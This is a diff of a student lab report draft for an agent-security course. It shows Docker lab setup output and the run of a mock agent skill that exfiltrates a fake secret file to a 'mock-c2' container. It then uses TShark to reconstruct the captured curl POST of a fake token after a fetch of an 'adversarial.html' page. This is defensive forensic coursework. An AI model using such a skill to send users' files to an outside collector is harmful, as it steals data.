@@ -2,24 +2,156 @@ report dump before we make the pdf
 
 TASK 1: 
 
-(1) Provide the output of docker compose ps and of docker network inspect for your lab network, showing
-the subnet and the three fixed IP addresses. (2) Before adding any firewall, run the mock skill with the exact
-trigger and show that mock-c2 received the file: compare the SHA-256 of /data/received.bin with that of
-fake_secrets.txt. (3) In your own words, explain what each container represents in the incident.
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose ps
+NAME         IMAGE           COMMAND                  SERVICE      CREATED          STATUS          PORTS
+agent-node   hw4-lab:local   "sleep infinity"         agent-node   29 seconds ago   Up 12 seconds   
+mock-c2      hw4-lab:local   "python /app/c2.py"      mock-c2      27 seconds ago   Up 11 seconds   0.0.0.0:8080->8080/tcp, [::]:8080->8080/tcp
+web-lab      hw4-lab:local   "python -m http.serv…"   web-lab      29 seconds ago   Up 13 seconds   0.0.0.0:8000->8000/tcp, [::]:8000->8000/tcp
 
-anna_s@anna-465:~/465-hw4/csce465-agentsec/hw4$ sudo docker compose ps
-NAME         IMAGE                        COMMAND                  SERVICE      CREATED          STATUS          PORTS
-agent-node   ubuntu:latest                "sleep infinity"         agent-node   45 seconds ago   Up 34 seconds   
-mock-c2      python:3.12.16-slim-trixie   "python -m http.serv…"   mock-c2      2 hours ago      Up 2 hours      0.0.0.0:8080->8080/tcp, [::]:8080->8080/tcp
-web-lab      python:3.12.16-slim-trixie   "python -m http.serv…"   web-lab      2 hours ago      Up 2 hours      0.0.0.0:8000->8000/tcp, [::]:8000->8000/tcp
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker network inspect hw4_hw4net
+[
+    {
+        "Name": "hw4_hw4net",
+        "Id": "e7ba85e049984cecdffa063fdd839060acdd222762a3bd2af0f671f86726e3c5",
+        "Created": "2026-11-19T18:56:07.633296851-05:00",
+        "Scope": "local",
+        "Driver": "bridge",
+        "EnableIPv4": true,
+        "EnableIPv6": false,
+        "IPAM": {
+            "Driver": "default",
+            "Options": null,
+            "Config": [
+                {
+                    "Subnet": "172.30.0.0/24",
+                    "Gateway": "172.30.0.1"
+                }
+            ]
+        },
+        "Internal": false,
+        "Attachable": false,
+        "Ingress": false,
+        "ConfigFrom": {
+            "Network": ""
+        },
+        "ConfigOnly": false,
+        "Options": {
+            "com.docker.network.bridge.name": "br-hw4"
+        },
+        "Labels": {
+            "com.docker.compose.config-hash": "e580e00a8df4afa6daed1a5508d627bc60f2e78f7238f1a029114a04b5c41e3f",
+            "com.docker.compose.network": "hw4net",
+            "com.docker.compose.project": "hw4",
+            "com.docker.compose.version": "5.8.0"
+        },
+        "Containers": {
+            "7dc527a8e0ab6fa14a331d0f913b2c6a509a207c4f69b6dc8d1efcb5a9f384fb": {
+                "Name": "mock-c2",
+                "EndpointID": "460e552766cf9be2d94f20bf5e33a3d259354e119cac088cb1cc929c8affeed7",
+                "MacAddress": "1e:cc:e8:77:13:83",
+                "IPv4Address": "172.30.0.66/24",
+                "IPv6Address": ""
+            },
+            "946b84cdcba0a355e504bafafa4979d57bb04224fea32ebf4beb16d6c2897202": {
+                "Name": "agent-node",
+                "EndpointID": "8cee1d75b7ba4ccf5c834e4f5650abd35d85d2c2aeb73af22f6a0508d2f37c19",
+                "MacAddress": "f6:ca:f1:4d:eb:81",
+                "IPv4Address": "172.30.0.10/24",
+                "IPv6Address": ""
+            },
+            "ba0c2b15a023ef1b294a2898748161ddb56f8747824e1af86b9425f61780617c": {
+                "Name": "web-lab",
+                "EndpointID": "2aac56800d0a163395c8e7670d9433f6bcd8b3d3b9ee480715642493516b4dc2",
+                "MacAddress": "4a:ed:8b:9b:a5:3d",
+                "IPv4Address": "172.30.0.40/24",
+                "IPv6Address": ""
+            }
+        },
+        "Status": {
+            "IPAM": {
+                "Subnets": {
+                    "172.30.0.0/24": {
+                        "IPsInUse": 6,
+                        "DynamicIPsAvailable": 250
+                    }
+                }
+            }
+        }
+    }
+]
+
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose exec agent-node /app/mock_skill.sh exfiltrate-course-file
+[mock-skill] Sending fake secret to mock-c2...
+
+[mock-skill] Exfiltration request completed.
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose exec mock-c2 ls -l /data/received.bin
+-rw-r--r-- 1 root root 35 Nov 20 19:08 /data/received.bin
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose exec agent-node sha256sum /app/fake_secrets.txt
+76c31395d3242ccfc90e48577ef877f799f7bcdf89f79a2600d9d678339e034a  /app/fake_secrets.txt
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose exec mock-c2 sha256sum /data/received.bin
+76c31395d3242ccfc90e48577ef877f799f7bcdf89f79a2600d9d678339e034a  /data/received.bin
 
 
 TASK 2:
 
-(1) Provide the scan output. (2) Present the reconstruction items above in a table, together with the
-TShark commands you used to obtain each one. (3) In your own words, describe the sequence of events
-that the capture shows, and explain what evidence shows that the listener on TCP 9009 is a separate,
-unauthorized service rather than part of web-lab or mock-c2.
+tshark -r hw4-malicious.pcap -Y http -T fields -e frame.number -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e http.request.method -e http.request.uri
+4	172.30.0.1	49876	172.30.0.40	8000	GET	/adversarial.html
+8	172.30.0.40	8000	172.30.0.1	49876		
+16	172.30.0.10	42570	172.30.0.66	8080	POST	/
+18	172.30.0.66	8080	172.30.0.10	42570	
+
+ls -lh hw4-malicious.pcap
+-rw-r--r-- 1 tcpdump tcpdump 3.0K Nov 20 14:32 hw4-malicious.pcap
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-malicious.pcap -Y http -T fields -e frame.number -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e http.request.method -e http.request.uri
+4	172.30.0.10	49876	172.30.0.40	8000	GET	/adversarial.html
+8	172.30.0.40	8000	172.30.0.1	49876		
+16	172.30.0.10	42570	172.30.0.66	8080	POST	/
+18	172.30.0.66	8080	172.30.0.10	42570		
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-malicious.pcap -Y 'http.request.method == "POST"' -T fields -e tcp.stream
+1
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-malicious.pcap -q -z follow,tcp,ascii,1
+
+===================================================================
+Follow: tcp,ascii
+Filter: tcp.stream eq 1
+Node 0: 172.30.0.10:42570
+Node 1: 172.30.0.66:8080
+185
+POST / HTTP/1.1
+Host: 172.30.0.66:8080
+User-Agent: curl/8.14.1
+Accept: */*
+Content-Length: 35
+Content-Type: application/x-www-form-urlencoded
+
+CSCE465-FAKE-TOKEN-2f67e97a501147ce
+	101
+HTTP/1.0 204 No Content
+Server: BaseHTTP/0.6 Python/3.12.16
+Date: Fri, 20 Nov 2026 19:32:09 GMT
+
+
+===================================================================
+
+tshark -r hw4-malicious.pcap -Y 'tcp.stream == 1' -T fields -e frame.number -e frame.time
+13	Nov 20, 2026 14:32:09.417365000 EST
+14	Nov 20, 2026 14:32:09.417441000 EST
+15	Nov 20, 2026 14:32:09.417478000 EST
+16	Nov 20, 2026 14:32:09.418432000 EST
+17	Nov 20, 2026 14:32:09.418451000 EST
+18	Nov 20, 2026 14:32:09.420826000 EST
+19	Nov 20, 2026 14:32:09.420907000 EST
+20	Nov 20, 2026 14:32:09.420984000 EST
+21	Nov 20, 2026 14:32:09.421407000 EST
+22	Nov 20, 2026 14:32:09.421449000 EST
+
+
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-clean.pcap -Y 'http.request.method == "POST"'
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-clean.pcap -Y http -T fields -e ip.src -e ip.dst -e http.request.method -e http.request.uri
+172.30.0.10	172.30.0.40	GET	/benign.html
+172.30.0.40	172.30.0.10		
+
+
 
 TASK 3:
 
